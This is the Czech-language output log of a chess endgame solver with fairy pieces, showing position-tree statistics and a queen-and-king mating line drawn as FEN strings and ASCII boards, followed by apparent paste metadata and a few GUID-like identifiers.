Pohádkové figury: A=Amazonka(Q+N), C=Cyril(R+N), E=Eve(B+N)
============================================================
[19:27:15] Průchod 1: Začátek analýzy
[19:27:15] Průchod 2: Začátek generování stromu pozic
[19:27:15] Průchod 3: Hloubka 0, pozic: 1
[19:27:15] Průchod 4: Hloubka 1, pozic: 23
[19:27:15] Průchod 5: Hloubka 2, pozic: 78
[19:27:15] Průchod 6: Hloubka 3, pozic: 685
[19:27:16] Průchod 7: Hloubka 4, pozic: 1305
[19:27:17] Průchod 8: Hloubka 5, pozic: 5584
[19:27:21] Průchod 9: Hloubka 6, pozic: 6739
[19:27:29] Průchod 9: Strom postaven, celkem pozic: 32746
[19:27:29] Průchod 10: Začátek ohodnocování pozic
[19:27:29] Průchod 11: Iterace ohodnocování 0
[19:27:29] Průchod 21: Iterace ohodnocování 10
[19:27:30] Průchod 31: Iterace ohodnocování 20
[19:27:30] Průchod 41: Iterace ohodnocování 30
[19:27:31] Průchod 51: Iterace ohodnocování 40
[19:27:31] Průchod 60: Ohodnocování dokončeno
[19:27:31] Průchod 61: Analýza dokončena za 16.29 sekund

Celkem pozic: 32746
Optimální cesta má 6 tahů

L[22]: {'radek': 1, 'N': [94, 95, 96, 97, 98], 'P': [0], 'FEN': '8/8/8/8/8/6k1/2Q5/6K1 b - - 1 1', 'board': <__main__.ChessBoard object at 0x000002C1A983E490>, 'to_mate': 6, 'to_end': 6}

Optimální cesta (prvních 10 tahů):
Tah 0 (Bílý): to_mate=5, FEN=8/8/8/8/Q7/6k1/8/6K1 w - - 0 1...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 Q . . . . . . .
3 . . . . . . k .
2 . . . . . . . .
1 . . . . . . K .
  a b c d e f g h
Tah 1 (Černý): to_mate=4, FEN=8/8/8/8/4Q3/6k1/8/6K1 b - - 1 1...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 . . . . Q . . .
3 . . . . . . k .
2 . . . . . . . .
1 . . . . . . K .
  a b c d e f g h
Tah 2 (Bílý): to_mate=3, FEN=8/8/8/8/4Q3/7k/8/6K1 w - - 2 2...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 . . . . Q . . .
3 . . . . . . . k
2 . . . . . . . .
1 . . . . . . K .
  a b c d e f g h
Tah 3 (Černý): to_mate=2, FEN=8/8/8/8/4Q3/7k/5K2/8 b - - 3 2...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 . . . . Q . . .
3 . . . . . . . k
2 . . . . . K . .
1 . . . . . . . .
  a b c d e f g h
Tah 4 (Bílý): to_mate=1, FEN=8/8/8/8/4Q3/8/5K1k/8 w - - 4 3...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 . . . . Q . . .
3 . . . . . . . .
2 . . . . . K . k
1 . . . . . . . .
  a b c d e f g h
Tah 5 (Černý): to_mate=0, FEN=8/8/8/8/7Q/8/5K1k/8 b - - 5 3...
8 . . . . . . . .
7 . . . . . . . .
6 . . . . . . . .
5 . . . . . . . .
4 . . . . . . . Q
3 . . . . . . . .
2 . . . . . K . k
1 . . . . . . . .
  a b c d e f g h

FINÁLNÍ VÝSLEDEK:
Pozic: 32746
Optimální cesta: 6 tahů
Mat v 5 tazích"
d8HQSaE2,PYRO_16_V7,Ilxom1991,Python,Friday 11th of July 2025 11:46:29 AM CDT,"'15E5ABBA-0A91-FD49-B0A5-126567561E4D'
'33444335-3934-5148-5146-465139344435'
'3974A00D-9148-11EB-80EE-38F3AB56E562'"
